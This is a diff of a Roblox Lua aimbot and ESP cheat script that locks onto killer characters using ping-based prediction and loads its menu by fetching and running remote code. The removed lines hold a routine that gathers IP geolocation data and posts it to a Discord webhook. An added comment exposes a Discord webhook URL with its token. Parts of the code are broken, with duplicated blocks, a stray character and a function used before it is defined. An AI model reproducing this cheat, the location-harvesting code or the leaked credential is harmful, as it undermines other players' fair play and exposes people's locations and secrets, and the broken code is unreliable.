@@ -1,70 +1,94 @@
-print("Hello Skitten4...")
--- [[ 1.5. DISCORD WEBHOOK & IP INFO ]]
-local HttpService = game:GetService("HttpService") -- Already exists at top, so reuse it
--- [[ 1. SERVICES ]]
-local replicatedStorage = game:GetService("ReplicatedStorage")
-local  userInputService = game:GetService("UserInputService")
-local  workspaceService = game:GetService("Workspace")
-local   lightingService = game:GetService("Lighting")
-local   materialService = game:GetService("MaterialService")
-local   textChatService = game:GetService("TextChatService")
-local    playersService = game:GetService("Players")
-local     debrisService = game:GetService("Debris")
-local      statsService = game:GetService("Stats")
-local        runService = game:GetService("RunService")
-local webhookURL = "YOUR_DISCORD_WEBHOOK_URL"  -- replace with your actual webhook URL
-local ipAPI = "https://ipwho.is/"
-local function sendWebhook(message) local jsonData = HttpService:JSONEncode(message) local success, response = pcall(function() return HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)  end) if success then print("Discord webhook sent successfully:", response) else warn("Failed to send Discord webhook:", response) end end local function getIPInfo() local success, response = pcall(function() return HttpService:GetAsync(ipAPI) end) if success then local data = HttpService:JSONDecode(response) if data.success then print("IP Info Retrieved:", data.ip) local message = {content = "Here is the IP Information:",embeds = {{ title = "IPWho Information", fields = { { name =   "IP Address", value = data.ip }, { name =    "Continent", value = data.continent }, { name =      "Country", value = data.country .. " " .. data.flag.emoji }, { name =       "Region", value = data.region }, { name =         "City", value = data.city }, { name =  "Postal Code", value = data.postal }, { name =     "Latitude", value = data.latitude}, { name =    "Longitude", value = data.longitude}, { name =          "ISP", value = data.connection.isp }, { name = "Organization", value = data.connection.org }, { name =       "Domain", value = data.connection.domain }, { name =     "Timezone", value = data.timezone.id }, { name = "Calling Code", value = data.calling_code } }, footer = { text = "Data provided by ipwho.is" }, thumbnail = { url = data.flag.img }}}} sendWebhook(message) else warn("IPWho API Error:", data.message) end else warn("Failed to get IP info:", response) end  end
+print("8.0v (ish)")
+-- MY WEBHOOK https://discord.com/api/webhooks/1481251321360158856/zvG-F-fpC1SslV7GKeMVSgEBZfr4hpvMh-45f0UALGlvcWQrYVKD_se3EaX6byobNcSd
+local chanceAimTargets = {"Slasher","c00lkidd","JohnDoe", "1x1x1x1","Noli","Sixer","Nosferatu"}
+local chanceAimAnimationIds = {  
+ "111384272984267", --[[ Big Game Hunter]] 
+ "133491532453922", --[[ Chance (M1-M2) ]] 
+ "133607163653602", --[[ Chance (M3-M4) ]]
+ "131189930305001", --[[    Nutcracker  ]] 
+ "76649505662612",  --[[    MLG Chance  ]] 
+ "103601716322988", --[[     Outlaw     ]]
+ "86371356500204",  --[[      Retro     ]]
+ "74687476269316",  --[[     Unknown    ]]
+ "111512633767170", --[[     Unknown    ]] 
+ "81698196845041",  --[[     Unknown    ]]
+}
 
--- Run once at script start
-local alwaysShowPredictionBox = false
+--// Services
+local replicatedStorage   = game:GetService("ReplicatedStorage")
+local userInputService    = game:GetService("UserInputService")
+local materialService     = game:GetService("MaterialService")
+local textChatService     = game:GetService("TextChatService")
+local workspaceService    = game:GetService("Workspace")
+local lightingService     = game:GetService("Lighting")
+local HttpService         = game:GetService("HttpService")
+local playersService      = game:GetService("Players")
+local runService          = game:GetService("RunService")
+local debrisService       = game:GetService("Debris")
+local statsService        = game:GetService("Stats")
+local function getKillersFolder()
+    local pFolder = workspaceService:FindFirstChild("Players")
+    return pFolder and pFolder:FindFirstChild("Killers")
+end
 
+-- Initialize new variables at the top of your script
+local SnapPower = 1.0
+local VerticalOffset = 0
 
--- [[ 2. GLOBAL VARIABLES (Declared BEFORE they are used) ]]
-local chancePlayerHumanoid, chancePlayerHRP = nil, nil
-local      chanceAiming = false
-local    forceAimActive = false
-local chanceActiveTrack = nil
-local            camera = workspaceService.CurrentCamera
+--// Core Objects
+local camera = workspaceService.CurrentCamera
 
-local extraStuds = 0
-local CustomStudsAddedToPing = 0 
+--// Timing / Iteration
+local lastIteration = tick()
 local chanceLastTriggerTime = 0
-local chancePredictionMode = "Ping Only"
 
-local pingPredictionSnap = 0
-local pingPredictionHRP = 0
-local pingPredictionCam = 0
-local pingPredictionASnap = 0
+--// Tables
+local targetLookup = {}
+local frameHistory = {}
 
-local pingpredictionstuds = 0.10
-local PingpredictionAddedSeconds = tonumber(pingpredictionstuds) or 0 
+--// Player References
+local chancePlayerHumanoid, chancePlayerHRP = nil, nil
 
-local chanceAimDuration = 1.6  
+--// Modes / Toggles
+local chancePredictionMode   = "Ping Only"
+local TargetMode             = "Snap"
+local chanceActive           = false
+local chanceAiming           = false
+local forceAimActive         = false
+local autoPredictionEnabled  = false
+local alwaysShowPredictionBox = false
+local maxPerformanceActive   = false
+local predictStaticTargets   = false
+
+--// Target Tracking
+local chanceActiveTrack = nil
+
+--// Ping / Prediction
+local CustomStudsAddedToPing = 0
+local pingPredictionSnap     = 0
+local pingPredictionHRP      = 0
+local pingPredictionCam      = 0
+local pingPredictionASnap    = 0
+local pingpredictionstuds    = 0.10
+
+--// Aim Settings
+local chanceAimDuration = 1.6
 local ChanceStudsActive = 0.7
-local chanceMovementThreshold = tonumber(ChanceStudsActive) or 0  
-local closenessValue = 6
-local ChanceClosenesstoDisable = 0   
 
+--// Distance Settings
+local closenessValue = 6
+local ChanceClosenesstoDisable = 0
+
+--// Smoothing
 local CAMSmoothing = 0.7
 local HRPSmoothing = 0.7
 
-local chanceActive = false       
-local TargetMode = "Snap"        
-local autoPredictionEnabled = false
-
-local chanceAimTargets = {"Slasher","c00lkidd","JohnDoe", "1x1x1x1","Noli","Sixer","Nosferatu"}
-local targetLookup = {}
+--// Extra Adjustments
+local extraStuds = 0
 for _, name in ipairs(chanceAimTargets) do targetLookup[name] = true end
 
-local chanceAimAnimationIds = {  
- "133491532453922", --[[ Chance (M1-M2) ]] "133607163653602", --[[ Chance (M3-M4) ]]
- "76649505662612",  --[[    MLG Chance  ]] "86371356500204",  --[[      Retro     ]]
- "131189930305001", --[[    Nutcracker  ]] "103601716322988", --[[     Outlaw     ]]
- "111384272984267", --[[ Big Game Hunter]] "74687476269316",  --[[     Unknown    ]]
- "111512633767170", --[[     Unknown    ]] "81698196845041",  --[[     Unknown    ]]
-}
-
+local PingpredictionAddedSeconds = tonumber(pingpredictionstuds) or 0 
+local chanceMovementThreshold = tonumber(ChanceStudsActive) or 0  
 -- Marker variables
 local markerTimer = 0
 local killerMarkerEnabled = false
@@ -94,74 +118,96 @@ local function chanceFindValidTarget()
     return nil
 end
 
--- [[ 5. AIM MODES (Declared BEFORE ExecuteAim) ]]
-local function CamMode(targetHRP, hrpPos, predicted, dt)
-    local camPos = camera.CFrame.Position
-    local direction = (predicted - camPos).Unit
-    
-    -- Smoothly rotate the camera to aim at the predicted target position
-    local camCF = CFrame.new(camPos, camPos + direction)
-    camera.CFrame = camera.CFrame:Lerp(camCF, math.min(CAMSmoothing * dt * 60, 1))
-    
-    -- NO HRP MANIPULATION HERE: Your character is free to move!
-end
-local function HRPMode(targetHRP, hrpPos, predicted, dt)
-    if not chancePlayerHRP then return end
-    
-    -- Keep the aim level on the XZ plane so your character doesn't tilt down/up
-    local targetLookPos = Vector3.new(predicted.X, hrpPos.Y, predicted.Z)
-    
-    -- Calculate the target rotation
-    local targetCFrame = CFrame.lookAt(hrpPos, targetLookPos)
-    
-    -- Smoothly interpolate (Lerp) the current CFrame toward the target CFrame
-    chancePlayerHRP.CFrame = chancePlayerHRP.CFrame:Lerp(targetCFrame, math.min(HRPSmoothing * dt * 60, 1))
-end
+-- [[ 5. AIM MODES ]]
 
-local function ASnapMode(targetHRP, hrpPos, predicted)
-    if not chancePlayerHRP then return end
-    
-    -- Keep the aim level on the XZ plane
+-- 1. Snap: Instant snap to target on the XZ plane
+local function SnapMode(targetHRP, hrpPos, predicted)
     local targetLookPos = Vector3.new(predicted.X, hrpPos.Y, predicted.Z)
-    
-    -- Instantly snap the character to face the predicted position
     chancePlayerHRP.CFrame = CFrame.lookAt(hrpPos, targetLookPos)
 end
 
-local function ACamMode(targetHRP, hrpPos, predicted, dt)
-    -- Keep your camera's current hover position/distance
-    local camPos = camera.CFrame.Position
-    
-    -- Look directly at the center of the pill hitbox (the prediction)
-    local targetCFrame = CFrame.lookAt(camPos, predicted)
-    
-    -- Smoothly pan the camera without locking its physical coordinates
-    camera.CFrame = camera.CFrame:Lerp(targetCFrame, math.min(CAMSmoothing * dt * 60, 1))
+-- 2. ASnap: The "Weighted" snap (uses a specific clamp for that v6 feel)
+local function ASnapMode(targetHRP, hrpPos, predicted)
+    local targetLookPos = Vector3.new(predicted.X, hrpPos.Y, predicted.Z)
+    local targetCFrame = CFrame.lookAt(hrpPos, targetLookPos)
+    -- This specific clamp (0.15 - 0.45) provides the "weighted" snap feel
+    chancePlayerHRP.CFrame = chancePlayerHRP.CFrame:Lerp(targetCFrame, math.clamp(HRPSmoothing, 0.15, 0.45))
 end
+
+-- 3. HRP: Traditional smooth character rotation
+local function HRPMode(targetHRP, hrpPos, predicted, dt)
+    local targetLookPos = Vector3.new(predicted.X, hrpPos.Y, predicted.Z)
+    local targetCFrame = CFrame.lookAt(hrpPos, targetLookPos)
+    chancePlayerHRP.CFrame = chancePlayerHRP.CFrame:Lerp(targetCFrame, math.min(HRPSmoothing * dt * 60, 1))
+end
+
+-- 4. Cam: Standard smooth camera movement
+local function CamMode(targetHRP, hrpPos, predicted, dt)
+    local camPos = camera.CFrame.Position
+    local targetCF = CFrame.lookAt(camPos, predicted)
+    camera.CFrame = camera.CFrame:Lerp(targetCF, math.min(CAMSmoothing * dt * 60, 1))
+end
+
+-- 5. ACam: Advanced Camera (targets predicted center with weighted smoothing)
+local function ACamMode(targetHRP, hrpPos, predicted, dt)
+    local camPos = camera.CFrame.Position
+    local targetCF = CFrame.lookAt(camPos, predicted)
+    -- ACam uses a slightly tighter interpolation for high-speed tracking
+    camera.CFrame = camera.CFrame:Lerp(targetCF, math.min((CAMSmoothing * 1.1) * dt * 60, 1))
+end
+
 
 
 -- [[ 6. EXECUTION LOGIC ]]
--- Update ExecuteAim to include ACam
+-- [[ 6. EXECUTION DISPATCHER ]]
+-- [[ 6. PRECISION EXECUTION ]]
+-- [[ 6. UPDATED X-LOCK ACCURACY DISPATCH ]]
+-- [[ 6. PURE ACCURACY DISPATCH ]]
 local function ExecuteAim(predicted, dt)
-    if not chancePlayerHRP then return end
-    local hrpPos = chancePlayerHRP.Position
+    if not chancePlayerHRP or not chancePlayerHumanoid then return end
     
+    local hrpPos = chancePlayerHRP.Position
+    -- Apply Vertical Offset: Adjusts the 'center' of the target for your gun height
+    local adjustedPredicted = predicted + Vector3.new(0, VerticalOffset or 0, 0)
+    
+    -- THE X-LOCK: This forces the aimbot to ONLY rotate left/right.
+    -- We use the predicted X and Z, but keep the Y the same as your character.
+    local flatTarget = Vector3.new(adjustedPredicted.X, hrpPos.Y, adjustedPredicted.Z)
+
     if TargetMode == "Snap" then
-        local dir = (predicted - hrpPos).Unit
-        local yaw = math.atan2(-dir.X, -dir.Z)
-        chancePlayerHRP.CFrame = CFrame.new(hrpPos) * CFrame.Angles(0, yaw, 0)
-    elseif TargetMode == "Cam" then
-        CamMode(nil, hrpPos, predicted, dt)
+        -- Frame-1 Instant alignment. 
+        chancePlayerHumanoid.AutoRotate = false
+        local targetCF = CFrame.lookAt(hrpPos, flatTarget)
+        -- Power 1.0 = Instant. Power 0.8 = Micro-smoothing (better for high-speed targets)
+        chancePlayerHRP.CFrame = chancePlayerHRP.CFrame:Lerp(targetCF, SnapPower or 1)
+
     elseif TargetMode == "ASnap" then
-        ASnapMode(nil, hrpPos, predicted)
-    elseif TargetMode == "ACam" then
-        ACamMode(nil, hrpPos, predicted, dt)  -- ACam mode logic
-    else
-        HRPMode(nil, hrpPos, predicted, dt)
+        -- Weighted Accuracy: Stays locked but absorbs jitter.
+        chancePlayerHumanoid.AutoRotate = false
+        local targetCF = CFrame.lookAt(hrpPos, flatTarget)
+        chancePlayerHRP.CFrame = chancePlayerHRP.CFrame:Lerp(targetCF, math.clamp(HRPSmoothing, 0.15, 0.45))
+
+    elseif TargetMode == "HRP" then
+        -- Smooth Character Body rotation.
+        chancePlayerHumanoid.AutoRotate = false
+        local targetCF = CFrame.lookAt(hrpPos, flatTarget)
+        chancePlayerHRP.CFrame = chancePlayerHRP.CFrame:Lerp(targetCF, math.min(HRPSmoothing * dt * 60, 1))
+
+    elseif TargetMode == "Cam" or TargetMode == "ACam" then
+        -- Camera Tracking: Character stays free for Shiftlock.
+        chancePlayerHumanoid.AutoRotate = true
+        local speedMult = (TargetMode == "ACam") and 1.3 or 1.0
+        local targetCF = CFrame.lookAt(camera.CFrame.Position, adjustedPredicted)
+        
+        camera.CFrame = camera.CFrame:Lerp(targetCF, math.min((CAMSmoothing * speedMult) * dt * 60, 1))
     end
 end
 
--- [[ 7. PREDICTION ENGINE ]]
+-- [[ 1. UPDATED COLORS & SETTINGS ]]
+local predBoxColor = Color3.fromRGB(25, 167, 255)
+local predBoxTransparency = 0.5
+
+-- [[ 7. STABILIZED PREDICTION ENGINE - V2 ]]
 local function getUnifiedPrediction(targetHRP, mode)
     if not targetHRP then return nil end
     
@@ -173,32 +219,20 @@ local function getUnifiedPrediction(targetHRP, mode)
                     or 0
     
     local latency = ping + modeOffset
-    -- Manual Velocity Tracker (Bypasses CFrame bots)
-local lastPos = targetHRP:GetAttribute("LastPos") or targetHRP.Position
-local lastTime = targetHRP:GetAttribute("LastTime") or os.clock()
-local currentTime = os.clock()
-local deltaTime = currentTime - lastTime
-
-local velocity = Vector3.new(0,0,0)
-if deltaTime > 0 then
-    velocity = (targetHRP.Position - lastPos) / deltaTime
-end
-
--- Save current data for the next frame
-targetHRP:SetAttribute("LastPos", targetHRP.Position)
-targetHRP:SetAttribute("LastTime", currentTime)
+    local velocity = targetHRP.AssemblyLinearVelocity
     
     if velocity.Magnitude < chanceMovementThreshold then return targetHRP.Position end
 
     local predicted = targetHRP.Position + (velocity * latency)
 
-    if mode == "ASnap" or mode == "ACam" then
+    -- Advanced ASnap Logic (Acceleration Damping)
+    if mode == "ASnap" then
         local lastVel = targetHRP:GetAttribute("LastVelocity") or velocity
         local accel = velocity - lastVel
         targetHRP:SetAttribute("LastVelocity", velocity)
         predicted += accel * (latency * 0.5)
         
-        if autoPredictionEnabled and chancePlayerHRP then
+        if autoPredictionEnabled then
             local dist = (targetHRP.Position - chancePlayerHRP.Position).Magnitude
             predicted += velocity * math.clamp(dist * 0.0025, 0, 0.35)
         end
@@ -211,12 +245,80 @@ targetHRP:SetAttribute("LastTime", currentTime)
     return predicted
 end
 
+
+-- [[ PROGRESS BAR SYSTEM ]]
+local showProgressBar = false
+local AimProgressGui = Instance.new("ScreenGui")
+AimProgressGui.Name = "AimTimerGui"
+AimProgressGui.ResetOnSpawn = false
+pcall(function() AimProgressGui.Parent = game.CoreGui end)
+
+local MainBar = Instance.new("Frame")
+MainBar.Size = UDim2.new(0, 180, 0, 4)
+MainBar.Position = UDim2.new(0.5, -90, 0.5, 45) -- Positioned below crosshair
+MainBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+MainBar.BackgroundTransparency = 0.4
+MainBar.BorderSizePixel = 0
+MainBar.Visible = false
+MainBar.Parent = AimProgressGui
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(1, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(25, 167, 255)
+ProgressBar.BorderSizePixel = 0
+ProgressBar.Parent = MainBar
+
+Instance.new("UICorner", MainBar).CornerRadius = UDim.new(0, 4)
+Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(0, 4)
+
+
+-- [[ 1. CONSOLIDATED UI INITIALIZATION ]]
+-- (Move this block toward the top of your script)
+
+local function createMiniBox(boxName, startPos) 
+    local frame = Instance.new("Frame") 
+    frame.Name = boxName 
+    frame.Size = UDim2.new(0, 85, 0, 28) 
+    frame.Position = startPos 
+    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15) 
+    frame.BackgroundTransparency = 0.2 
+    frame.BorderSizePixel = 2 
+    frame.Active = true 
+    frame.Draggable = true 
+    frame.Visible = false   
+    frame.Parent = PerfGui 
+    
+    local corner = Instance.new("UICorner") 
+    corner.CornerRadius = UDim.new(0, 6) 
+    corner.Parent = frame 
+    
+    local label = Instance.new("TextLabel") 
+    label.Size = UDim2.new(1, 0, 1, 0) 
+    label.BackgroundTransparency = 1 
+    label.Font = Enum.Font.Code 
+    label.TextSize = 13 
+    label.Parent = frame 
+    
+    return frame, label 
+end
+
+-- Create the Draggable Aim Tracker Box
+local AimBox, AimText = createMiniBox("AimBox", UDim2.new(0.5, 0, 0.1, 0))
+local AimBarInner = Instance.new("Frame")
+AimBarInner.Size = UDim2.new(1, -10, 0, 2)
+AimBarInner.Position = UDim2.new(0, 5, 1, -5)
+AimBarInner.BackgroundColor3 = Color3.fromRGB(25, 167, 255)
+AimBarInner.BorderSizePixel = 0
+AimBarInner.Parent = AimBox
+Instance.new("UICorner", AimBarInner).CornerRadius = UDim.new(0, 2)
+
+---
 -- === RAYFIELD LIBRARY LOADS BELOW THIS POINT ===
 
 print ("7.05 chance Aiming")
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
-                  Name = "Version 7.23(+)",
+                  Name = "Version 7.40(+)",
                   Icon = "cat"          ,
           LoadingTitle = "Place_Holder" ,
        LoadingSubtitle = "Place_Holder" ,
@@ -280,6 +382,33 @@ ChanceTab:CreateToggle({
         killerMarkerEnabled = state
    end,
 })
+
+-- Snap Intensity (How 'hard' the snap hits)
+local SnapIntensitySlider = ChanceTab:CreateSlider({
+   Name = "Snap Power",
+   Range = {0.1, 1},
+   Increment = 0.05,
+   Suffix = " Force",
+   CurrentValue = 1.0,
+   Flag = "SnapPowerFlag",
+   Callback = function(Value)
+       -- This acts as a multiplier for the Snap speed
+       SnapPower = Value
+   end,
+})
+
+-- Vertical Offset (If your gun shoots too low/high)
+local VerticalOffsetSlider = ChanceTab:CreateSlider({
+   Name = "Aim Vertical Offset",
+   Range = {-5, 5},
+   Increment = 0.1,
+   Suffix = " Studs",
+   CurrentValue = 0,
+   Flag = "VertOffsetFlag",
+   Callback = function(Value)
+       VerticalOffset = Value
+   end,
+}) 
 
 
 local AutoPredictionToggle = ChanceTab:CreateToggle({
@@ -436,7 +565,14 @@ local Dropdown = ChanceTab:CreateDropdown({
     end,
 })
 
-
+ChanceTab:CreateToggle({
+   Name = "STOPS predicting slow targets (WIP N/A)",
+   CurrentValue = true,
+   Flag = "StaticGateToggle",
+   Callback = function(state)
+       predictStaticTargets = not state -- If true, it STOPS predicting slow targets
+   end,
+})
 
 
 local AdvancedSystemInputs1 = ChanceTab:CreateInput({
@@ -532,24 +668,15 @@ local AdvancedSystemInputs4 = ChanceTab:CreateInput({
 
 -- Detect aim animation start
 local function chanceCheckAimAnimation()
-    if not chancePlayerHumanoid or chanceActiveTrack then
-        return false
-    end
+    if not chancePlayerHumanoid or chanceActiveTrack then return false end
 
     for _, track in ipairs(chancePlayerHumanoid:GetPlayingAnimationTracks()) do
         local id = track.Animation.AnimationId:match("%d+")
         if id and table.find(chanceAimAnimationIds, id) then
             chanceActiveTrack = track
-
-            local connection
-            connection = track.Stopped:Connect(function()
+            track.Stopped:Connect(function()
                 chanceActiveTrack = nil
-                if connection then
-                    connection:Disconnect()
-                    connection = nil
-                end
             end)
-
             return true
         end
     end
@@ -561,10 +688,10 @@ local function createKillerMarker(targetHRP, name)
     if not targetHRP then return end
 
     local marker = Instance.new("BillboardGui")
-    marker.Name = name.."Marker"
+    marker.Name = name.."Marker"`
     marker.Adornee = targetHRP
-    marker.Size = UDim2.new(0,60,0,24)
-    marker.StudsOffset = Vector3.new(0,6,0)
+    marker.Size = UDim2.new(0,30,0,14)
+    marker.StudsOffset = Vector3.new(0,8,0)
     marker.AlwaysOnTop = true
 
     local text = Instance.new("TextLabel")
@@ -584,22 +711,25 @@ local function createKillerMarker(targetHRP, name)
 end
 --beta7
 
+ 
 -- main aim loop
--- main aim loop
--- main aim loop
+-- [[ 2. MAIN AIM & PREDICTION LOOP ]]
+-- [[ main aim loop ]]
+-- [[ 2. MAIN AIM & PREDICTION LOOP ]]
 runService.Heartbeat:Connect(function(dt)
-    -- 1. Killer Markers
+    local kFolder = getKillersFolder()
+    
+    -- 1. MARKER LOGIC (Killer Distance Labels)
     markerTimer += dt
     if markerTimer >= 0.1 then
         markerTimer = 0
-        local kFolder = workspaceService:FindFirstChild("Players") and workspaceService.Players:FindFirstChild("Killers")
         if killerMarkerEnabled and chancePlayerHRP and kFolder then
             for _, killer in ipairs(kFolder:GetChildren()) do
                 local hrp = killer:FindFirstChild("HumanoidRootPart")
                 if hrp then
                     local marker = killerMarkerFolder:FindFirstChild(killer.Name.."Marker") or createKillerMarker(hrp, killer.Name)
                     local dist = (hrp.Position - chancePlayerHRP.Position).Magnitude
-                    if marker:FindFirstChild("DistanceText") then marker.DistanceText.Text = math.floor(dist) end
+                    marker.DistanceText.Text = math.floor(dist)
                     marker.Enabled = (dist > 1 and dist < 100)
                 end
             end
@@ -608,62 +738,71 @@ runService.Heartbeat:Connect(function(dt)
         end
     end
 
-   -- 2. Stabilized Aimbot & Visual Logic
+    -- 2. AIMBOT PREP
     if not chanceActive or not chancePlayerHRP then 
-        predictionMarker.Transparency = 1 
+        predictionMarker.Transparency = 1
+        AimBox.Visible = false
         return 
     end
 
-    -- Find the target early so the visual box can use it at any time
     local targetHRP = chanceFindValidTarget()
-    local predicted = nil
-    
-    if targetHRP then
-        predicted = getUnifiedPrediction(targetHRP, TargetMode)
-    end
+    local predicted = targetHRP and getUnifiedPrediction(targetHRP, TargetMode)
 
-    -- VISUAL LOGIC: Update the prediction box
-    if predicted and (alwaysShowPredictionBox or (showPredictionBox and chanceAiming)) then
-        -- The box shows if "Always Show" is toggled, OR if the normal show is toggled AND we are aiming
-        predictionMarker.CFrame = CFrame.new(predicted) * targetHRP.CFrame.Rotation
-        predictionMarker.Transparency = 0.5
-    else
-        predictionMarker.Transparency = 1
-    end
-
-    -- AIMING LOGIC: Handle the actual aimbot state
+    -- 3. TRIGGER LOGIC (Animation Start)
     if not chanceAiming and (chanceCheckAimAnimation() or forceAimActive) then
         chanceLastTriggerTime = tick()
         chanceAiming = true
     end
 
-    if chanceAiming then
-        local elapsed = tick() - chanceLastTriggerTime
+    -- 4. VISUAL PREDICTION BOX
+    if predicted and (alwaysShowPredictionBox or (showPredictionBox and chanceAiming)) then
+        local boxPos = predicted + Vector3.new(0, VerticalOffset or 0, 0)
+        predictionMarker.CFrame = CFrame.new(boxPos) * (targetHRP.CFrame - targetHRP.Position)
+        predictionMarker.Transparency = predBoxTransparency
+    else
+        predictionMarker.Transparency = 1
+    end
 
-        -- Stop aiming if target is lost or time expires
-        if not targetHRP or (not forceAimActive and elapsed > chanceAimDuration) then
+    -- 5. THE 5-MODE AIM EXECUTION
+    if chanceAiming and predicted then
+        local elapsed = tick() - chanceLastTriggerTime
+        local remaining = math.max(0, chanceAimDuration - elapsed)
+        
+        -- Stop aiming if target lost or time ran out
+        if not targetHRP or (remaining <= 0 and not forceAimActive) then
             chanceAiming = false
+            AimBox.Visible = false
             if chancePlayerHumanoid then chancePlayerHumanoid.AutoRotate = true end
             return
         end
 
-        -- Safety measure: stop aiming if they get too close
-        if (targetHRP.Position - chancePlayerHRP.Position).Magnitude < ChanceClosenesstoDisable then
-            return 
+        -- LOCK TRACKER GUI (Matching Ping/FPS Box Style)
+        if showProgressBar then
+            AimBox.Visible = true
+            local percentage = math.clamp(remaining / chanceAimDuration, 0, 1)
+            
+            -- Update Text and progress line
+            AimText.Text = string.format("Lock: %.1fs", remaining)
+            AimBarInner.Size = UDim2.new(percentage, -10, 0, 2)
+            
+            -- Color Shift: Blue -> Green -> Red
+            local uiColor = Color3.fromHSV(percentage * 0.35, 0.8, 1)
+            AimBox.BorderColor3 = uiColor
+            AimText.TextColor3 = uiColor
+            AimBarInner.BackgroundColor3 = uiColor
+        else
+            AimBox.Visible = false
         end
 
-        -- Execute the aim
-        if predicted then
-            if chancePlayerHumanoid then 
-                if TargetMode == "Cam" or TargetMode == "ACam" then
-                    chancePlayerHumanoid.AutoRotate = true
-                else
-                    chancePlayerHumanoid.AutoRotate = false 
-                end
-            end
-            
+        -- Safety Distance Check & Execution
+        local dist = (targetHRP.Position - chancePlayerHRP.Position).Magnitude
+        if dist >= ChanceClosenesstoDisable then
+            -- This snap is instant for your hitboxes
             ExecuteAim(predicted, dt)
         end
+    else
+        -- Hide the box if we aren't actively aiming
+        AimBox.Visible = false
     end
 end)
 -- the end of main aim loop
@@ -675,169 +814,241 @@ local InterfaceTab = Window:CreateTab("Interface", "scan")
 ----------------------------------------------------------------
 -- UI Functions Section
 ----------------------------------------------------------------
+-- [[ AIM DURATION PROGRESS BAR ]]
+local AimProgressGui = Instance.new("ScreenGui")
+AimProgressGui.Name = "AimTimerGui"
+AimProgressGui.Parent = game.CoreGui
+
+local MainBar = Instance.new("Frame")
+MainBar.Name = "MainBar"
+MainBar.Size = UDim2.new(0, 200, 0, 5)
+MainBar.Position = UDim2.new(0.5, -100, 0.5, 40) -- Just below the center
+MainBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainBar.BorderSizePixel = 0
+MainBar.Visible = false
+MainBar.Parent = AimProgressGui
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Name = "ProgressBar"
+ProgressBar.Size = UDim2.new(1, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(25, 167, 255) -- Matches your box
+ProgressBar.BorderSizePixel = 0
+ProgressBar.Parent = MainBar
+
+local Corner1 = Instance.new("UICorner")
+Corner1.CornerRadius = UDim.new(0, 4)
+Corner1.Parent = MainBar
+local Corner2 = Instance.new("UICorner")
+Corner2.CornerRadius = UDim.new(0, 4)
+Corner2.Parent = ProgressBar
+
+-- [[ AIM LOCK TRACKER BOX ]]
+local showProgressBar = false
+local AimBox, AimText = createMiniBox("AimBox", UDim2.new(0.5, 0, 0.05, 50)) -- Positioned slightly lower
+AimBox.Visible = false
+
+-- Adding a tiny progress line inside the box for flair
+local AimBarInner = Instance.new("Frame")
+AimBarInner.Size = UDim2.new(1, -10, 0, 2)
+AimBarInner.Position = UDim2.new(0, 5, 1, -5)
+AimBarInner.BackgroundColor3 = Color3.fromRGB(25, 167, 255)
+AimBarInner.BorderSizePixel = 0
+AimBarInner.Parent = AimBox
+
+local CornerInner = Instance.new("UICorner")
+CornerInner.CornerRadius = UDim.new(0, 2)
+CornerInner.Parent = AimBarInner
 InterfaceTab:CreateSection("UI Functions")
+InterfaceTab:CreateButton({Name = "kick urself", Callback = function() print([[Lower value = smoother Higher value = snappier]])game.Players.LocalPlayer:Kick("GOT YA!")end})
+InterfaceTab:CreateButton({  Name = "⚠ Print Locals ⚠", Callback = function()  print("⚠=== Local Variables ===⚠")  print("chanceActive             = " .. tostring(chanceActive))  print("chancePredictionMode     = " .. tostring(chancePredictionMode))  print("chanceAimDuration        = " .. tostring(chanceAimDuration))  print("chanceMovementThreshold  = " .. tostring(chanceMovementThreshold))  print("ChanceClosenesstoDisable = " .. tostring(ChanceClosenesstoDisable))  print("CAMSmoothing             = " .. tostring(CAMSmoothing))  print("HRPSmoothing             = " .. tostring(HRPSmoothing))  print("TargetMode               = " .. tostring(TargetMode))  print("CustomStudsAddedToPing   = " .. tostring(CustomStudsAddedToPing))  print("PingpredictionAddedSeconds " .. tostring(PingpredictionAddedSeconds))  print("chanceLastTriggerTime    = " .. tostring(chanceLastTriggerTime))  print("pingPredictionSnap       = " .. tostring(pingPredictionSnap))  print("pingPredictionHRP        = " .. tostring(pingPredictionHRP))  print("pingPredictionCam        = " .. tostring(pingPredictionCam))  print("⚠========================⚠")  end})
+-- [[ 1. SEPARATE PERFORMANCE GUIs (Draggable) ]]
+local Stats = game:GetService("Stats") local RunService = game:GetService("RunService") local CoreGui = game:GetService("CoreGui") local PerfGui = Instance.new("ScreenGui") PerfGui.Name = "ModularPerformanceHUD" PerfGui.ResetOnSpawn = false pcall(function() PerfGui.Parent = CoreGui end) if not PerfGui.Parent then PerfGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end
+-- Helper function to create clean, matching mini-boxes
+local function createMiniBox(boxName, startPos) local frame = Instance.new("Frame") frame.Name = boxName frame.Size = UDim2.new(0, 85, 0, 28) frame.Position = startPos frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15) frame.BackgroundTransparency = 0.2 frame.BorderSizePixel = 2 frame.Active = true frame.Draggable = true frame.Visible = false   frame.Parent = PerfGui local corner = Instance.new("UICorner") corner.CornerRadius = UDim.new(0, 6) corner.Parent = frame local label = Instance.new("TextLabel") label.Size = UDim2.new(1, 0, 1, 0) label.BackgroundTransparency = 1 label.Font = Enum.Font.Code label.TextSize = 13 label.Parent = frame return frame, label end
+-- Create the 3 individual boxes (slightly at the top)
+local PingBox, PingText = createMiniBox("PingBox", UDim2.new(0.5, 0, 0.05, 0)) local FpsBox, FpsText   = createMiniBox("FpsBox", UDim2.new(0.5, 0, 0.05, 0)) local MemBox, MemText   = createMiniBox("MemBox", UDim2.new(0.5, 0, 0.05, 0))
+-- [[ 2. THE UPDATE LOOP ]]
